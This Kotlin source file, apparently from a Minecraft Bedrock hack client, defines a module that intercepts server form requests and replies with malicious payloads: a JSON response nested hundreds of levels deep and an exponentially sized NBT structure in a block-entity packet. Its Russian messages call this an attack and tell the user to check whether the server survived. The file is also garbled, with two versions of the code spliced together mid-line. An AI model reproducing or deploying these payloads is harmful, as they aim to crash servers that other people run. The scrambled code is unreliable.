package com.mucheng.mucute.client.game.module.misc

import com.mucheng.mucute.client.game.InterceptablePacket
import com.mucheng.mucute.client.game.Module
import com.mucheng.mucute.client.game.ModuleCategory
import org.cloudburstmc.math.vector.Vector3i
importEnabled() {
        super.onEnabled()
        session.displayClientMessage("§a[AnomalousTester] Модуль включен. Ожидание формы-триггера.")
    }

    override fun kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import org.cloudburstmc.nbt.NbtMap
import org.cloudburstmc.protocol.bedrock.packet.BlockEntityDataPacket
import org.cloudburstmc.protocol.bedrock.packet.ModalFormRequestPacket
import org onDisabled() {
        super.onDisabled()
        session.displayClientMessage("§c[AnomalousTester] Модуль выключен.")
    }

    override fun beforePacketBound(interceptablePacket: InterceptablePacket) {
        if (!isEnabled) return

        val packet = interceptablePacket.packet
        if (.cloudburstmc.protocol.bedrock.packet.ModalFormResponsePacket

class AnomalousPacketTester : Modulepacket is ModalFormRequestPacket) {
            interceptablePacket.intercept()
            
            session.displayClientMessage("§("AnomalousPacketTester", ModuleCategory.Misc) {

    private val testWithDeepJson by boolValue("6[AnomalousTester] Форма перехвачена! Запускаю аномальную атаку...")

            GlobalTest Deep JSON Bomb", true)
    private val testWithNbtBomb by boolValue("Test NBT Bomb", trueScope.launch {
                if (testWithDeepJson) {
                    sendDeeplyNestedFormResponse(packet)
    private val attackDelay by intValue("Attack Delay (ms)", 200, 50.formId)
                    delay(attackDelay.value.toLong())
                }
                if (testWith..2000)
    private val jsonNestingDepth by intValue("JSON Nesting Depth", 800NbtBomb) {
                    sendNbtBombPacket()
                }
                session.displayClientMessage("§a, 100..5000)
    private val nbtBombDepth by intValue("N[AnomalousTester] Атака завершена. Проверяйте состояние сервера.")
            }
        }
BT Bomb Depth", 12, 5..20)
    private val nbtBombWidth by int    }

    private fun sendDeeplyNestedFormResponse(formId: Int) {
        try {
            valValue("NBT Bomb Width", 10, 5..20)

    override fun onEnabled() { responsePacket = ModalFormResponsePacket()
            responsePacket.formId = formId

            var maliciousJson =
        super.onEnabled()
        session.displayClientMessage("§a[AnomalousTester] Мо "\"leaf\""
            for (i in 1..jsonNestingDepth.value) {
                maliciousJsonдуль включен. Ожидание формы-триггера.")
    }

    override fun onDisabled() {
 = "{\"key\":$maliciousJson}"
            }
            responsePacket.formData = maliciousJson
            
            session        super.onDisabled()
        session.displayClientMessage("§c[AnomalousTester] Моду.send(responsePacket)
            session.displayClientMessage("§e[AnomalousTester] Отправлена JSONль выключен.")
    }

    override fun beforePacketBound(interceptablePacket: InterceptablePacket)-бомба (глубина: ${jsonNestingDepth.value}).")
        } catch (e: {
        if (!isEnabled) return

        val packet = interceptablePacket.packet
        if (packet is Exception) {
            session.displayClientMessage("§c[AnomalousTester] Ошибка при отправке JSON- ModalFormRequestPacket) {
            interceptablePacket.intercept()
            session.displayClientMessage("§6бомбы: ${e.message}")
        }
    }

    private fun sendNbtBombPacket() {
        try {
            val nbtPacket = BlockEntityDataPacket()
            nbtPacket.block[AnomalousTester] Форма перехвачена! Запускаю аномальную атаку...")

            GlobalScope.launch {
                if (testWithDeepJson.value) {
                    sendDeeplyNestedFormResponse(packet.Position = Vector3i.ZERO

            val payload: Any = "payload_data"

            var currentLevelformId)
                    delay(attackDelay.value.toLong())
                }
                if (testWith: Any = payload
            for (d in 1..nbtBombDepth.value) {
                val nextNbtBomb.value) {
                    sendNbtBombPacket()
                }
                session.displayClientMessage("Level = mutableListOf<Any>()
                for (w in 1..nbtBombWidth.value) {
                    §a[AnomalousTester] Атака завершена. Проверяйте состояние сервера.")
            }
        }
nextLevel.add(currentLevel)
                }
                currentLevel = nextLevel
            }
            
    }

    private fun sendDeeplyNestedFormResponse(formId: Int) {
        try {
            val            val root = NbtMap.of("bomb", currentLevel)

            nbtPacket.data = root // Эта responsePacket = ModalFormResponsePacket()
            // <<< ИЗМЕНЕНО: Используем явный сеттер
 строка теперь 100% правильная
            
            session.send(nbtPacket)
            val total            responsePacket.setFormId(formId)

            var maliciousJson = "\"leaf\""
            for (i inElements = Math.pow(nbtBombWidth.value.toDouble(), nbtBombDepth.value.toDouble()). 1..jsonNestingDepth.value) {
                maliciousJson = "{\"key\":$maliciousJson}"toLong()
            session.displayClientMessage("§e[AnomalousTester] Отправлена NBT-бомба
            }
            // <<< ИЗМЕНЕНО: Используем явный сеттер
            responsePacket (глубина: ${nbtBombDepth.value}, ширина: ${nbtBombWidth.value}, ~.setFormData(maliciousJson)
            
            session.send(responsePacket)
            session.display${totalElements} элементов).")
        } catch (e: Exception) {
            session.displayClientMessageClientMessage("§e[AnomalousTester] Отправлена JSON-бомба (глубина: ${jsonNesting("§c[AnomalousTester] Ошибка при отправке NBT-бомбы: ${e.message}")
        Depth.value}).")
        } catch (e: Exception) {
            session.displayClientMessage("§}
    }
                                         }
